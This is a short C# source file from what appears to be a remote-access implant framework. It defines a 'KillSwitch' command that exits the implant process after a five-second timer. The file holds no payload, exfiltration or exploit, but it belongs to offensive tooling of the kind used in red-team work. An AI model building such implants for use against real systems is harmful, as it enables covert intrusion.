using System;
using System.Timers;

using Implant.Models;

namespace Implant.Tasks.Execute
{
    internal class Exit : ImplantCommands
    {
        public override string Name => "KillSwitch";

        public override string Execute(ImplantTask task)
        {

            Timer timer = new Timer();
            timer.Interval = 5000;
            timer.AutoReset = false;
            timer.Elapsed += SelfDestruct;
            timer.Start();

            return "";
        }

        private static void SelfDestruct(object sender, ElapsedEventArgs e) { Environment.Exit(0); }
    }
}
